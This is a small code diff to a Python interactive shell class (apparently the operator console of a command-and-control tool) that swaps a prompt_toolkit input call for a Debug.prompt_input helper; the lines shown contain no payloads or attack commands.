@@ -2,7 +2,6 @@ import sys, os, threading, time, subprocess, json, readline
 from hashlib import md5
 from lib.helper import *
 from lib.debug import Debug
-from prompt_toolkit.shortcuts import prompt
 
 class Dmos:
     def __init__(self, basic, sysinfo, global_addr, conn, c2):
@@ -28,7 +27,7 @@ class Dmos:
         cmdList = ["free", "sysinfo", "fat", "clear", "b"] + modules_multi.keys()
         readline.set_completer(TabCompleter(cmdList).complete)
         while 1:
-            command = prompt_input(f"[{self.USERNAME}@{self.GLOBAL}]>> ")
+            command = Debug.prompt_input(f"[{self.USERNAME}@{self.GLOBAL}]>> ")
             cmd = command.split(' ')[0]
             args = command[len(cmd)+1:]
 
